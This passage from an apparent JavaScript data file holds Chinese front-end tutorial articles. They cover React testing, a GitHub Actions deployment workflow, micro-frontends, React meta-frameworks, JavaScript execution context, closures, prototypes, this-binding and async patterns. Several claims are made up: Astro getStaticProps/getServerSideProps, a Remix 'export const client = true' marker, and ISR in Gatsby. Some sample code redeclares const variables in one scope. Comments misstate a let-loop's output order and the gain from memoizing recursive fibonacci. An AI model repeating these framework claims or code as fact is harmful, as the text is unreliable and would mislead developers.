    await userEvent.type(screen.getByLabelText(/password/i), 'password123');
    await userEvent.click(screen.getByRole('button', { name: /submit/i }));
    
    expect(handleSubmit).toHaveBeenCalledWith({
      email: 'test@example.com',
      password: 'password123',
    });
  });

  it('shows validation error for invalid email', async () => {
    render(<LoginForm onSubmit={jest.fn()} />);
    
    await userEvent.type(screen.getByLabelText(/email/i), 'invalid-email');
    await userEvent.click(screen.getByRole('button', { name: /submit/i }));
    
    expect(screen.getByText(/invalid email/i)).toBeInTheDocument();
  });
});
\`\`\`

**部署与运维：**
- CI/CD 流程：自动化构建、测试、部署
- 环境配置管理：使用环境变量管理不同环境配置
- 监控和日志：集成错误追踪和性能监控

\`\`\`yaml
# GitHub Actions CI/CD 示例
name: CI/CD Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Lint
        run: npm run lint
      
      - name: Type check
        run: npm run typecheck
      
      - name: Test
        run: npm run test:coverage
      
      - name: Build
        run: npm run build
      
      - name: Deploy to Vercel
        if: github.ref == 'refs/heads/main'
        run: npx vercel --prod --token=\${{ secrets.VERCEL_TOKEN }}
\`\`\``,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-microfrontends",title:"React 微前端架构实践",category:"react",difficulty:"hard",tags:["React","微前端","Module Federation","架构"],content:`## React 微前端架构实践

微前端是将大型前端应用拆分为多个独立部署的小型应用的架构模式。

### 微前端核心概念

**什么是微前端：**
- 将大型应用拆分为多个小型应用
- 每个微应用独立开发、部署、维护
- 集成到同一个容器应用中

**优势：**
- 团队独立开发，加快迭代速度
- 技术栈独立选择
- 故障隔离，提高可靠性
- 按需加载，提高性能

**挑战：**
- 集成复杂性
- 样式隔离
- 状态管理
- 路由协调

### 实现方案

**Module Federation：**
- Webpack 5 提供的功能：Webpack 5提供了持久化缓存、模块联邦（Module Federation）、改进的Tree Shaking等新特性，模块联邦允许在不同构建之间共享代码，是微前端架构的重要基础，持久化缓存可以显著加快构建速度，是现代React项目构建工具的主流选择
- 动态加载远程模块
- 支持运行时共享依赖

**Single-SPA：**
- 微前端框架
- 支持多种框架
- 路由管理和应用生命周期

**qiankun：**
- 基于 Single-SPA 的微前端框架
- 提供更完善的功能
- 支持 React、Vue、Angular 等

### 实践要点

**应用拆分：**
- 按业务域拆分
- 合理定义微应用边界
- 避免过度拆分

**通信机制：**
- 基于事件的通信
- 共享状态管理
-  props 传递

**样式隔离：**
- CSS Modules：CSS Modules是CSS模块化解决方案，通过将CSS类名转换为唯一的哈希值来实现作用域隔离，避免样式冲突，支持组合、变量等特性，可以在React组件中直接导入使用，是React项目中常用的CSS组织方式，配合webpack的css-loader或Vite的CSS模块支持使用
- Shadow DOM：Shadow DOM是Web Components的核心特性，提供了完全的样式隔离，React可以通过React Shadow DOM库使用Shadow DOM，Shadow DOM内部的样式不会影响外部，外部样式也不会影响内部，适合创建可复用的组件，特别是需要严格样式隔离的组件，如第三方组件库
- CSS-in-JS：CSS-in-JS是将CSS样式写在JavaScript中的解决方案，主流库包括styled-components和emotion，优点是可以在JS中使用CSS特性如嵌套、变量、混合宏等，组件样式与组件代码共存便于维护，缺点是运行时开销和可能的包体积增加，适合需要动态样式或组件化样式管理的项目

**依赖共享：**
- 共享基础依赖
- 避免依赖冲突
- 版本管理策略

### 最佳实践

**容器应用：**
- 负责路由管理
- 提供共享服务
- 处理应用加载和卸载

**微应用：**
- 独立开发和部署
- 定义清晰的接口
- 处理自己的状态和逻辑

**CI/CD：**
- 独立的构建和部署流程
- 自动化测试
- 集成测试

**监控和日志：**
- 统一的监控系统
- 分布式日志
- 性能监控`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-meta-frameworks",title:"React 元框架对比与选择",category:"react",difficulty:"medium",tags:["React","Next.js","Remix","元框架"],content:`## React 元框架对比与选择

元框架为 React 应用提供了更完整的开发体验，包括路由、SSR、构建等功能。

### 主流元框架

**Next.js：**
- Vercel 开发的 React 元框架：Next.js是Vercel开发的React元框架，提供了服务端渲染（SSR）、静态站点生成（SSG）、增量静态再生成（ISR）等高级渲染模式，内置文件系统路由、API路由、图像优化等功能，是React全栈开发的标配，Vercel提供一键部署支持
- 支持 SSG、SSR、ISR
- 内置路由、API 路由
- 强大的生态系统

**Remix：**
- React 团队成员开发：Remix是React Router团队成员开发的全栈React框架，强调Web标准、渐进增强和更好的用户体验，提供了嵌套路由、数据加载、错误处理等完整解决方案，Remix的loader和action模式简化了服务端和客户端的数据交互，是现代React全栈开发的有力选择
- 基于 Web Fetch API
- 嵌套路由和数据加载
- 注重用户体验

**Gatsby：**
- 静态站点生成器
- 基于 GraphQL
- 丰富的插件生态
- 适合内容驱动的网站

**Astro：**
- 多框架支持
- 部分水合技术
- 极致的性能优化
- 适合内容网站

### 核心特性对比

**路由系统：**
- Next.js：基于文件系统的路由
- Remix：嵌套路由，支持布局：Remix使用嵌套路由组织页面结构，子路由可以在父路由的Outlet中渲染，支持布局嵌套和共享，支持loader函数进行服务端数据加载，action函数处理表单提交，提供了良好的数据加载和用户体验，是现代全栈React框架的热门选择
- Gatsby：基于文件系统，支持客户端路由：Gatsby是基于React的静态站点生成器，使用GraphQL查询数据，支持从多种数据源（文件系统、CMS、API）获取数据构建静态网站，提供了丰富的插件生态系统，适合构建博客、文档站点、营销页面等内容驱动型网站，生成的静态页面加载速度极快
- Astro：基于文件系统，支持页面组件：Astro是现代静态站点生成器，支持使用React、Vue、Svelte等组件框架编写页面，Astro的独特之处在于默认使用零JavaScript渲染（Islands Architecture），只在需要交互的部分加载JavaScript，提供了极佳的首屏性能，适合内容丰富但交互较少的网站

**数据获取：**
- Next.js：getStaticProps、getServerSideProps、getStaticPaths
- Remix：loader 函数，嵌套数据加载：Remix使用loader函数在服务器端加载数据，loader函数在每个路由组件中定义，可以访问请求对象、数据库、API等，Remix支持嵌套路由的嵌套数据加载，父路由和子路由的loader可以并行执行，数据加载完成后才会渲染组件，这种设计确保了组件渲染时数据已经准备好，避免了loading状态，提供了更好的用户体验
- Gatsby：GraphQL 数据源：Gatsby使用GraphQL作为数据查询语言，可以从各种数据源（Markdown文件、CMS、API、数据库等）获取数据，Gatsby在构建时执行GraphQL查询，生成静态HTML和JSON数据文件，Gatsby的GraphQL查询在组件中定义，可以精确指定需要的数据，Gatsby还提供GraphiQL交互式查询编辑器，帮助开发者编写和调试GraphQL查询
- Astro：getStaticPaths、getStaticProps：Astro使用getStaticPaths和getStaticProps函数进行静态生成，getStaticPaths用于定义动态路由的所有可能路径，返回一个包含params和props的数组，getStaticProps用于获取每个路径的数据，Astro在构建时执行这些函数，生成静态HTML文件，Astro还支持getServerSideProps进行服务端渲染，提供灵活的数据获取方式

**渲染模式：**
- Next.js：SSG、SSR、ISR、Client Components
- Remix：SSR、Client Components：Remix默认使用服务端渲染（SSR），在服务器端渲染HTML并返回给客户端，Remix也支持客户端组件（Client Components），通过export const client = true标记组件为客户端组件，客户端组件会在浏览器中执行，可以处理用户交互和状态，Remix的SSR和客户端组件结合使用，既保证了SEO和首屏性能，又提供了良好的交互体验
- Gatsby：SSG、Client Components：Gatsby专注于静态站点生成（SSG），在构建时生成所有页面的HTML文件，Gatsby也支持客户端组件，通过React的useEffect和useState等Hook实现客户端交互，Gatsby的SSG提供了极佳的SEO和首屏性能，客户端组件提供了丰富的交互体验，Gatsby还支持增量静态再生成（ISR），可以在构建后更新特定页面
- Astro：SSG、部分水合

### 选择原则

**项目类型：**
- 企业应用：Next.js 或 Remix
- 内容网站：Gatsby 或 Astro
- 性能要求高：Astro
- 功能丰富：Next.js

**团队熟悉度：**
- 团队熟悉 React：Next.js
- 团队熟悉 Node.js：Remix
- 团队熟悉 GraphQL：Gatsby

**部署环境：**
- Vercel：Next.js 最佳：Vercel是Next.js的官方部署平台，提供零配置的部署体验，Vercel自动优化Next.js应用，包括图片优化、字体优化、边缘函数等，Vercel支持预览部署、回滚、A/B测试等高级功能，Vercel的全球CDN网络确保了快速的内容分发，是Next.js项目的最佳部署选择
- 其他云平台：Next.js、Remix
- 静态托管：Gatsby、Astro

### 最佳实践

**项目结构：**
- 遵循框架的约定
- 合理组织文件和组件
- 保持代码清晰

**性能优化：**
- 利用框架的优化特性
- 代码分割和懒加载
- 合理使用缓存

**开发体验：**
- 使用框架的开发工具
- 配置 ESLint 和 Prettier
- 自动化测试

**部署策略：**
- 选择合适的托管平台
- 配置 CI/CD 流程
- 监控应用性能`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-fundamentals",title:"JavaScript 核心概念与执行机制",category:"javascript",difficulty:"medium",tags:["JavaScript","执行上下文","闭包","原型链"],content:`## JavaScript 核心概念与执行机制

JavaScript 是一门单线程、非阻塞、异步的脚本语言，理解其核心概念和执行机制对于编写高质量的代码至关重要。

### 🔄 执行上下文

**执行上下文的类型：**
- **全局执行上下文：代码开始执行时创建**：全局执行上下文是JavaScript代码开始执行时创建的第一个执行上下文，在浏览器环境中全局执行上下文的this指向window对象，在Node.js环境中指向global对象，全局执行上下文包含全局变量、全局函数、this绑定、变量环境、词法环境等，全局执行上下文在页面关闭或程序结束时销毁
- **函数执行上下文：函数被调用时创建**：函数执行上下文是函数被调用时创建的执行上下文，每个函数调用都会创建一个新的执行上下文，函数执行上下文包含函数的参数、局部变量、this绑定、变量环境、词法环境、外部环境引用（outer）等，函数执行上下文在函数执行完毕后销毁，但闭包会保持对外部环境的引用
- **eval 执行上下文：eval 函数执行时创建**：eval执行上下文是eval函数执行时创建的执行上下文，eval函数可以动态执行字符串形式的JavaScript代码，eval执行上下文可以访问调用eval函数的作用域，eval函数的使用会影响性能和安全性，不推荐在生产代码中使用eval函数，可以使用Function构造函数或JSON.parse等替代方案

**执行上下文的创建过程：**
1. **创建变量对象 (VO)**
2. **建立作用域链**
3. **确定 this 指向**

**执行上下文栈：**
- **后进先出 (LIFO) 结构**
- **管理函数调用顺序**
- **函数执行完毕后从栈中弹出**

### 💻 代码示例：执行上下文演示

\`\`\`javascript
// 全局执行上下文
var globalVar = 'global';

function outer() {
  // outer 函数执行上下文
  var outerVar = 'outer';
  
  function inner() {
    // inner 函数执行上下文
    var innerVar = 'inner';
    console.log(innerVar); // 'inner'
    console.log(outerVar); // 'outer'
    console.log(globalVar); // 'global'
  }
  
  inner();
}

outer();
\`\`\`

#### 变量提升示例

\`\`\`javascript
// 变量提升
console.log(a); // undefined，不是 ReferenceError
var a = 10;

console.log(b); // ReferenceError
let b = 20;

// 函数提升
console.log(foo); // 函数定义
foo(); // 'foo'

function foo() {
  console.log('foo');
}

console.log(bar); // undefined
bar(); // TypeError: bar is not a function

var bar = function() {
  console.log('bar');
};
\`\`\`

### 闭包

**什么是闭包：**
- 函数能够访问其词法作用域之外的变量
- 即使函数在其词法作用域之外执行

**闭包的应用：**
- 实现私有变量
- 模块化
- 函数柯里化
- 防抖和节流

**闭包的优缺点：**
- 优点：实现数据封装和模块化：闭包的优点是可以实现数据封装和模块化，通过闭包可以创建私有变量和方法，避免全局命名空间污染，闭包可以保存函数的执行上下文，实现数据的持久化，闭包是JavaScript实现模块化、工厂模式、单例模式等设计模式的基础
- 缺点：可能导致内存泄漏：闭包的缺点是可能导致内存泄漏，因为闭包会保持对外部环境的引用，如果闭包被长时间引用，外部环境的变量和函数不会被垃圾回收，导致内存占用增加，在使用闭包时应该注意及时释放闭包引用，避免内存泄漏

### 代码示例

#### 闭包实现私有变量

\`\`\`javascript
function createCounter() {
  let count = 0;
  
  return {
    increment() {
      count++;
      return count;
    },
    decrement() {
      count--;
      return count;
    },
    getCount() {
      return count;
    }
  };
}

const counter = createCounter();
console.log(counter.increment()); // 1
console.log(counter.increment()); // 2
console.log(counter.decrement()); // 1
console.log(counter.getCount()); // 1
// count 变量无法直接访问，实现了私有变量
\`\`\`

#### 闭包实现模块模式

\`\`\`javascript
const Module = (function() {
  let privateVar = 'private';
  
  function privateMethod() {
    console.log('This is a private method');
  }
  
  return {
    publicMethod() {
      console.log('This is a public method');
      privateMethod();
      console.log(privateVar);
    },
    publicVar: 'public'
  };
})();

Module.publicMethod();
// Module.privateMethod(); // ReferenceError
// Module.privateVar; // undefined
\`\`\`

#### 闭包实现防抖

\`\`\`javascript
function debounce(func, wait) {
  let timeout;
  
  return function(...args) {
    const context = this;
    
    clearTimeout(timeout);
    
    timeout = setTimeout(() => {
      func.apply(context, args);
    }, wait);
  };
}

// 使用示例
const handleInput = debounce((e) => {
  console.log('Input:', e.target.value);
}, 300);

document.getElementById('input').addEventListener('input', handleInput);
\`\`\`

#### 闭包实现节流

\`\`\`javascript
function throttle(func, limit) {
  let inThrottle;
  
  return function(...args) {
    const context = this;
    
    if (!inThrottle) {
      func.apply(context, args);
      inThrottle = true;
      
      setTimeout(() => {
        inThrottle = false;
      }, limit);
    }
  };
}

// 使用示例
const handleScroll = throttle(() => {
  console.log('Scrolling...');
}, 100);

window.addEventListener('scroll', handleScroll);
\`\`\`

### 原型链

**原型链的概念：**
- JavaScript 中对象通过原型链继承属性和方法：JavaScript使用原型继承机制，每个对象都有一个内部属性[[Prototype]]指向其原型对象，当访问对象的属性或方法时，如果对象本身没有该属性，JavaScript会沿着原型链向上查找直到找到为止或返回undefined，原型链的顶端是Object.prototype，这种继承方式称为原型继承，是JavaScript面向对象编程的基础
- 每个对象都有一个原型对象
- 原型对象也是对象，也有自己的原型
- 直到 null

**原型链的工作原理：**
- 当访问对象的属性时，会先在对象自身查找
- 如果找不到，会沿着原型链向上查找
- 直到找到或到达原型链末端

### 代码示例

#### 原型链示例

\`\`\`javascript
function Person(name) {
  this.name = name;
}

Person.prototype.sayHello = function() {
  console.log(\`Hello, my name is \${this.name}\`);
};

const person = new Person('Alice');
person.sayHello(); // 'Hello, my name is Alice'

console.log(person.__proto__ === Person.prototype); // true
console.log(Person.prototype.__proto__ === Object.prototype); // true
console.log(Object.prototype.__proto__ === null); // true
\`\`\`

#### 原型继承

\`\`\`javascript
function Animal(name) {
  this.name = name;
}

Animal.prototype.eat = function() {
  console.log(\`\${this.name} is eating\`);
};

function Dog(name, breed) {
  Animal.call(this, name);
  this.breed = breed;
}

// 设置原型链
Dog.prototype = Object.create(Animal.prototype);
Dog.prototype.constructor = Dog;

Dog.prototype.bark = function() {
  console.log(\`\${this.name} is barking\`);
};

const dog = new Dog('Buddy', 'Golden Retriever');
dog.eat(); // 'Buddy is eating'
dog.bark(); // 'Buddy is barking'
\`\`\`

#### ES6 类继承

\`\`\`javascript
class Animal {
  constructor(name) {
    this.name = name;
  }
  
  eat() {
    console.log(\`\${this.name} is eating\`);
  }
}

class Dog extends Animal {
  constructor(name, breed) {
    super(name);
    this.breed = breed;
  }
  
  bark() {
    console.log(\`\${this.name} is barking\`);
  }
}

const dog = new Dog('Buddy', 'Golden Retriever');
dog.eat(); // 'Buddy is eating'
dog.bark(); // 'Buddy is barking'
\`\`\`

### this 指向

**this 的绑定规则：**
- 默认绑定：全局对象或 undefined（严格模式）：默认绑定是this绑定的默认规则，当函数独立调用时（不作为对象方法、不使用call/apply/bind、不使用new），this指向全局对象（浏览器中的window，Node.js中的global），在严格模式下this指向undefined，默认绑定是this绑定中最常见的情况
- 隐式绑定：调用对象：隐式绑定是this绑定的规则之一，当函数作为对象的方法调用时，this指向调用该函数的对象，隐式绑定依赖于函数的调用方式，如果函数被赋值给其他变量或作为回调函数传递，隐式绑定会丢失，需要使用显式绑定或箭头函数保持this绑定
- 显式绑定：call、apply、bind：显式绑定是通过call、apply、bind方法强制指定函数的this绑定，call和apply方法立即调用函数，call方法接收参数列表，apply方法接收参数数组，bind方法返回一个新函数，新函数的this被永久绑定到指定的对象，显式绑定可以解决隐式绑定丢失的问题
- new 绑定：新创建的对象：new绑定是使用new关键字调用构造函数时的this绑定规则，this指向新创建的对象，new绑定会创建一个新对象，将构造函数的prototype属性赋值给新对象的[[Prototype]]属性，执行构造函数，如果构造函数没有返回对象则返回新对象，new绑定是创建对象实例的基础
- 箭头函数：词法作用域的 this：箭头函数没有自己的this绑定，this继承自外层作用域，箭头函数的this在函数定义时就确定，而不是在调用时确定，箭头函数不能作为构造函数使用，不能使用call、apply、bind改变this绑定，箭头函数适合用于回调函数、事件处理函数等需要保持this绑定的场景

### 深入理解

#### 变量提升的详细机制

**变量提升的本质：**
- JavaScript 引擎在代码执行前进行编译：JavaScript引擎在执行代码前会先进行编译，编译阶段会进行词法分析生成抽象语法树（AST），进行作用域分析确定变量和函数的声明位置，进行代码优化生成字节码，编译完成后进入执行阶段，执行阶段会创建执行上下文，逐行解释执行字节码，了解编译过程有助于理解变量提升、闭包等核心概念
- 函数声明和变量声明被提升到作用域顶部
- 函数声明优先于变量声明
- let 和 const 也有提升，但存在暂时性死区

**暂时性死区（TDZ）：**
- let 和 const 变量在声明前无法访问
- 从作用域开始到变量声明之间的区域
- 避免在声明前使用变量

#### 作用域链的查找过程

**查找顺序：**
1. 在当前作用域中查找变量
2. 如果未找到，向上一级作用域查找
3. 重复步骤1-2，直到全局作用域
4. 如果全局作用域也未找到，抛出 ReferenceError

**词法作用域 vs 动态作用域：**
- JavaScript 使用词法作用域（静态作用域）：词法作用域是指变量的作用域在代码编写时就确定了，而不是在运行时确定，函数定义时决定了其可以访问哪些变量，嵌套函数可以访问外层函数的变量，这种作用域模型使得代码分析更简单，也是闭包能够工作的基础，与之相对的是动态作用域（如bash脚本使用）
- 作用域在函数定义时确定，而不是调用时
- 与动态作用域（如某些语言中的 eval）不同

#### 闭包的内存管理

**闭包的内存占用：**
- 闭包会保持对外部变量的引用
- 这些变量不会被垃圾回收
- 长期存在的闭包可能导致内存泄漏

**避免内存泄漏的方法：**
- 及时释放闭包引用
- 避免在循环中创建大量闭包
- 使用弱引用（WeakMap、WeakSet）
- 在不需要时手动解除引用

#### 原型链的查找优化

**原型链查找的性能：**
- 原型链查找是动态的，每次访问属性都需要查找
- 深层原型链查找可能影响性能
- 可以通过缓存属性值来优化

**优化策略：**
- 将常用属性直接定义在对象上
- 避免过深的原型链
- 使用 Object.create(null) 创建无原型对象

#### this 绑定的优先级

**绑定优先级（从高到低）：**
1. new 绑定
2. 显式绑定（bind > call/apply）
3. 隐式绑定
4. 默认绑定

**特殊情况：**
- 箭头函数的 this 继承自外层作用域
- DOM 事件处理函数中的 this 指向事件目标：在DOM事件处理函数中，this关键字指向触发事件的DOM元素（event.currentTarget），可以通过this访问元素的属性和方法，如this.value、this.style等，这种行为与普通函数中的this不同，事件处理函数中的this绑定是JavaScript事件系统自动处理的
- setTimeout/setInterval 中的 this 指向全局对象

#### 事件循环的深入理解

**事件循环的组成部分：**
- 调用栈（Call Stack）
- 任务队列（Task Queue）
- 微任务队列（Microtask Queue）
- Web APIs（定时器、DOM 事件等）：Web APIs是浏览器提供的JavaScript接口，用于与浏览器环境交互，包括setTimeout/setInterval定时器API、DOM操作API、fetch网络请求API、Storage存储API、Canvas绘图API等，这些API大多是异步的， callback会被添加到任务队列中等待执行，是JavaScript实现异步编程的重要基础

**浏览器环境 vs Node.js 环境：**
- 浏览器：宏任务包括 setTimeout、setInterval、UI 渲染
- Node.js：宏任务包括 setTimeout、setInterval、I/O 操作：Node.js的事件循环与浏览器有所不同，宏任务包括setTimeout、setInterval、setImmediate、I/O操作（文件读写、网络请求等），微任务包括Promise回调、process.nextTick（优先级最高），Node.js的事件循环有多个阶段如timers、pending callbacks、idle/prepare、poll、check等，了解Node.js事件循环对编写高效的Node.js应用很重要
- 微任务在两者中基本相同

**性能优化：**
- 避免长时间运行的同步代码
- 合理使用 requestAnimationFrame
- 将大任务拆分为小任务
- 使用 Web Worker 处理 CPU 密集型任务

### 实战应用

#### 模块化实现

\`\`\`javascript
// 使用闭包实现模块
const myModule = (function() {
  // 私有变量和方法
  let privateVar = 0;
  
  function privateMethod() {
    return privateVar * 2;
  }
  
  // 公共 API
  return {
    increment() {
      privateVar++;
      console.log('Incremented:', privateVar);
    },
    decrement() {
      privateVar--;
      console.log('Decremented:', privateVar);
    },
    getValue() {
      return privateMethod();
    }
  };
})();

// 使用模块
myModule.increment(); // Incremented: 1
myModule.increment(); // Incremented: 2
console.log(myModule.getValue()); // 4
myModule.decrement(); // Decremented: 1
\`\`\`

#### 函数柯里化

\`\`\`javascript
// 柯里化函数
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    } else {
      return function(...moreArgs) {
        return curried.apply(this, args.concat(moreArgs));
      };
    }
  };
}

// 使用柯里化
function add(a, b, c) {
  return a + b + c;
}

const curriedAdd = curry(add);
console.log(curriedAdd(1)(2)(3)); // 6
console.log(curriedAdd(1, 2)(3)); // 6
console.log(curriedAdd(1, 2, 3)); // 6

// 实际应用：创建可复用的函数
const multiply = (a, b) => a * b;
const double = curry(multiply)(2);
console.log(double(5)); // 10
console.log(double(10)); // 20
\`\`\`

#### 高阶函数

\`\`\`javascript
// 高阶函数：接受函数作为参数或返回函数
function withLogging(fn) {
  return function(...args) {
    console.log('Calling function with args:', args);
    const result = fn.apply(this, args);
    console.log('Function returned:', result);
    return result;
  };
}

// 使用高阶函数
function add(a, b) {
  return a + b;
}

const loggedAdd = withLogging(add);
loggedAdd(3, 4); // Calling function with args: [3, 4] // Function returned: 7

// 实际应用：权限检查
function withAuth(fn) {
  return function(...args) {
    if (!isAuthenticated()) {
      throw new Error('Not authenticated');
    }
    return fn.apply(this, args);
  };
}

function deleteUser(userId) {
  // 删除用户逻辑
  console.log('Deleting user:', userId);
}

const protectedDeleteUser = withAuth(deleteUser);
\`\`\`

#### 性能优化示例

\`\`\`javascript
// 使用闭包缓存计算结果
function memoize(fn) {
  const cache = new Map();
  
  return function(...args) {
    const key = JSON.stringify(args);
    
    if (cache.has(key)) {
      console.log('Cache hit:', key);
      return cache.get(key);
    }
    
    const result = fn.apply(this, args);
    cache.set(key, result);
    console.log('Cache miss:', key);
    return result;
  };
}

// 使用记忆化
function fibonacci(n) {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
}

const memoizedFibonacci = memoize(fibonacci);
console.log(memoizedFibonacci(10)); // 大幅提升性能

// 使用节流优化滚动事件
function optimizedScrollHandler() {
  // 节流后的处理逻辑
  console.log('Optimized scroll handler');
}

const throttledScroll = throttle(optimizedScrollHandler, 100);
window.addEventListener('scroll', throttledScroll);
\`\`\`

### 常见陷阱和解决方案

#### 循环中的闭包陷阱

\`\`\`javascript
// 错误示例
for (var i = 0; i < 5; i++) {
  setTimeout(function() {
    console.log(i); // 输出 5, 5, 5, 5, 5
  }, 100);
}

// 解决方案1：使用 let
for (let i = 0; i < 5; i++) {
  setTimeout(function() {
    console.log(i); // 输出 0, 1, 2, 3, 4
  }, 100);
}

// 解决方案2：使用闭包
for (var i = 0; i < 5; i++) {
  (function(j) {
    setTimeout(function() {
      console.log(j); // 输出 0, 1, 2, 3, 4
    }, 100);
  })(i);
}
\`\`\`

#### this 绑定陷阱

\`\`\`javascript
// 陷阱1：方法中的 this
const obj = {
  name: 'Alice',
  getName() {
    console.log(this.name); // 正确
  },
  getArrowName: () => {
    console.log(this.name); // 错误，this 指向全局对象
  }
};

obj.getName(); // 'Alice'
obj.getArrowName(); // undefined

// 解决方案
const obj = {
  name: 'Alice',
  getArrowName() {
    const self = this;
    return () => {
      console.log(self.name); // 正确
    };
  }
};

// 陷阱2：事件处理中的 this
class Button {
  constructor() {
    this.count = 0;
    this.button = document.createElement('button');
    this.button.textContent = 'Click me';
    
    // 错误：this 指向 button 元素
    this.button.addEventListener('click', this.handleClick);
  }
  
  handleClick() {
    this.count++; // 错误：this.count 是 undefined
    console.log('Clicked:', this.count);
  }
}

// 解决方案1：使用 bind
this.button.addEventListener('click', this.handleClick.bind(this));

// 解决方案2：使用箭头函数
this.button.addEventListener('click', () => this.handleClick());
\`\`\`

#### 异步陷阱

\`\`\`javascript
// 陷阱：期望同步执行
console.log('1');
setTimeout(() => console.log('2'), 0);
console.log('3');
// 输出：1, 3, 2

// 陷阱：循环中的异步操作
for (let i = 0; i < 3; i++) {
  setTimeout(() => {
    console.log(i); // 0, 1, 2（顺序不确定）
  }, 100);
}

// 解决方案：使用 async/await 确保顺序
async function sequentialLoop() {
  for (let i = 0; i < 3; i++) {
    await new Promise(resolve => {
      setTimeout(() => {
        console.log(i);
        resolve();
      }, 100);
    });
  }
}
sequentialLoop(); // 0, 1, 2（按顺序）
\`\`\`

### 代码示例

#### this 绑定规则

\`\`\`javascript
// 默认绑定
function foo() {
  console.log(this); // 全局对象或 undefined（严格模式）
}
foo();

// 隐式绑定
const obj = {
  name: 'Alice',
  foo() {
    console.log(this.name); // 'Alice'
  }
};
obj.foo();

// 显式绑定
function greet() {
  console.log(\`Hello, \${this.name}\`);
}
const person = { name: 'Bob' };
greet.call(person); // 'Hello, Bob'
greet.apply(person); // 'Hello, Bob'
const boundGreet = greet.bind(person);
boundGreet(); // 'Hello, Bob'

// new 绑定
function Person(name) {
  this.name = name;
}
const person = new Person('Charlie');
console.log(person.name); // 'Charlie'

// 箭头函数
const obj = {
  name: 'Alice',
  foo() {
    const arrow = () => {
      console.log(this.name); // 'Alice'
    };
    arrow();
  }
};
obj.foo();
\`\`\`

### 事件循环

**事件循环的概念：**
- JavaScript 执行机制的核心：事件循环（Event Loop）是JavaScript执行机制的核心，通过不断从任务队列中取出任务执行来驱动JavaScript程序的运行，事件循环会优先执行微任务队列中的所有任务，然后再执行宏任务队列中的一个任务，这种执行顺序确保了Promise等微任务能够快速响应，是理解JavaScript异步编程的关键
- 处理异步操作
- 由主线程、宏任务队列和微任务队列组成

**执行过程：**
1. 执行主线程代码
2. 执行微任务队列中的所有任务
3. 执行宏任务队列中的一个任务
4. 重复步骤 2-3

**宏任务和微任务：**
- 宏任务：setTimeout、setInterval、I/O 操作
- 微任务：Promise、async/await、process.nextTick

### 代码示例

#### 事件循环示例

\`\`\`javascript
console.log('1');

setTimeout(() => {
  console.log('2');
}, 0);

Promise.resolve().then(() => {
  console.log('3');
});

console.log('4');

// 输出顺序：1, 4, 3, 2
\`\`\`

#### 复杂事件循环

\`\`\`javascript
console.log('1');

setTimeout(() => {
  console.log('2');
  Promise.resolve().then(() => {
    console.log('3');
  });
}, 0);

Promise.resolve().then(() => {
  console.log('4');
  setTimeout(() => {
    console.log('5');
  }, 0);
});

console.log('6');

// 输出顺序：1, 6, 4, 2, 3, 5
\`\`\`

### 最佳实践

- 理解执行上下文和作用域
- 合理使用闭包，避免内存泄漏
- 理解原型链和继承
- 正确处理 this 指向
- 掌握异步编程模式
- 编写清晰、可维护的代码

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-async",title:"JavaScript 异步编程模式",category:"javascript",difficulty:"medium",tags:["JavaScript","异步","Promise","async/await"],content:`## JavaScript 异步编程模式

JavaScript 是一门单线程语言，异步编程是其核心特性之一，掌握各种异步编程模式对于编写高性能的应用至关重要。

### 回调函数

**回调函数的概念：**
- 作为参数传递给其他函数的函数
- 在异步操作完成后被调用

**回调地狱：**
- 嵌套的回调函数
- 代码难以阅读和维护
- 错误处理复杂

### 代码示例

#### 回调函数示例

\`\`\`javascript
// 基本回调函数
function fetchData(callback) {
  setTimeout(() => {
    const data = { name: 'Alice', age: 25 };
    callback(null, data);
  }, 1000);
}

fetchData((error, data) => {
  if (error) {
    console.error('Error:', error);
    return;
  }
  console.log('Data:', data);
});

// 回调地狱
fetchData((error, data) => {
  if (error) {
    console.error('Error:', error);
    return;
  }
  
  processData(data, (error, processedData) => {
    if (error) {
      console.error('Error:', error);
      return;
    }
    
    saveData(processedData, (error, result) => {
      if (error) {
        console.error('Error:', error);
        return;
      }
      
      console.log('Result:', result);
    });
  });
});
\`\`\`

### Promise

**Promise 的概念：**
- 表示一个异步操作的最终完成或失败
- 有三种状态：pending、fulfilled、rejected
- 状态一旦改变就不会再变

**Promise 的方法：**
- then()：处理成功的结果
- catch()：处理错误
- finally()：无论成功或失败都会执行
- all()：等待所有 Promise 完成
- race()：等待第一个 Promise 完成
- allSettled()：等待所有 Promise 完成或失败
- any()：等待第一个成功的 Promise

### 代码示例

#### Promise 基础示例

\`\`\`javascript
// 创建 Promise
const promise = new Promise((resolve, reject) => {
  setTimeout(() => {
    const success = Math.random() > 0.5;
    
    if (success) {
      resolve({ name: 'Alice', age: 25 });
    } else {
      reject(new Error('Failed to fetch data'));
    }
  }, 1000);
});

// 使用 Promise
promise
  .then(data => {
    console.log('Data:', data);
    return data;
  })
  .catch(error => {
    console.error('Error:', error);
  })
  .finally(() => {
    console.log('Operation completed');
  });
\`\`\`

#### Promise 链式调用

\`\`\`javascript
function fetchData() {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ name: 'Alice', age: 25 });
    }, 1000);
  });
}

function processData(data) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ ...data, processed: true });
    }, 500);
  });
}

function saveData(data) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ success: true, data });
    }, 300);
  });
}

// 链式调用
fetchData()
  .then(data => {
    console.log('Fetched:', data);
    return processData(data);
  })
  .then(data => {
    console.log('Processed:', data);
    return saveData(data);
  })
  .then(result => {
    console.log('Saved:', result);
  })
  .catch(error => {
    console.error('Error:', error);
  });
\`\`\`

#### Promise.all 并发执行

\`\`\`javascript
function fetchUser(id) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ id, name: \`User \${id}\` });
    }, 1000);
  });
}

function fetchPosts(userId) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve([
        { id: 1, userId, title: 'Post 1' },
